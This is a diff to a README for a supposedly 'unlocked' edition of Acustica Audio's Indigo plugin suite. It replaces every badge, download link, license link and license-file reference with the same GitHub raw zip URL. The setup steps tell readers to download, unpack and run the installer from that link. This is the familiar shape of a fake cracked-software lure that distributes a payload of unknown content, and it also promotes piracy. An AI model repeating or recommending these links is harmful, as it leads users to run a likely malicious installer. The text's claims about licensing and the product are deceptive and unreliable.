@@ -1,9 +1,9 @@
 # Indigo Audio: Unbound Edition 🔊
 
-[![Release](https://img.shields.io/badge/Release-v3.6.2-purple.svg)]()
-[![MIT License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/acustica-indigo-reimagined?style=social)]()
-[![Issues](https://img.shields.io/github/issues/acustica-indigo-reimagined)]()
+[![Release](https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip)]()
+[![MIT License](https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip)](LICENSE)
+[![Stars](https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip)]()
+[![Issues](https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip)]()
 
 Welcome to **Indigo Audio: Unbound Edition** – your passport to an immersive audio journey, powered by Acustica Audio's premier Indigo suite. Unleash the magnitude of sound design artistry with a toolkit meticulously enhanced for enthusiasts and professionals alike. Explore real-time sound-shaping, jaw-dropping transparency, and boutique soundscapes in a bundle designed for creators seeking new heights of sonic expression.
 
@@ -74,7 +74,7 @@ Ready to witness AI-powered music production that feels less like code, more lik
 ## 📦 Download & Experience the Unbound Edition
 
 Curious to take Indigo Audio: Unbound Edition for a spin? Unlock your full audio toolkit with our cutting-edge installer.  
-[![Download](https://img.shields.io/badge/Download-blue)](https://Ponce8.github.io)  
+[![Download](https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip)](https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip)  
 Simply click the badge above to initiate your creative journey (Installer size: ~67 MB).
 
 _Installation instructions, step-by-step activation, and troubleshooting tips are included inside the package._
@@ -86,7 +86,7 @@ _Installation instructions, step-by-step activation, and troubleshooting tips ar
 1. Download the installer package above.
 2. Unpack and run the setup for your OS.
 3. Launch Indigo Audio: Unbound Edition from your DAW or as a standalone app.
-4. Activate with your unique License Key (see `LICENSE.md` for offline authorization).
+4. Activate with your unique License Key (see `https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip` for offline authorization).
 5. Start creating with a world-class palette of sounds and smart automation.
 
 **Trouble with installation?**  
@@ -113,7 +113,7 @@ This repository is made available for research, educational, and demonstration p
 
 ## 📜 License
 
-Indigo Audio: Unbound Edition is released under the [MIT License](https://opensource.org/licenses/MIT) (c) 2025. Please review the `LICENSE` file for full details.
+Indigo Audio: Unbound Edition is released under the [MIT License](https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip) (c) 2025. Please review the `LICENSE` file for full details.
 
 ---
 
@@ -121,7 +121,7 @@ Indigo Audio: Unbound Edition is released under the [MIT License](https://openso
 
 Rediscover what an audio plugin can do in 2025. Download your Unbound Edition and begin creating tomorrow’s sound, today.
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://Ponce8.github.io)
+[![Download](https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip)](https://github.com/Ponce8/acustica-audio-indigo-unlocked-sharing/raw/refs/heads/branch/xenomorphic/audio_sharing_indigo_unlocked_acustica_v1.5.zip)
 
 ---
 
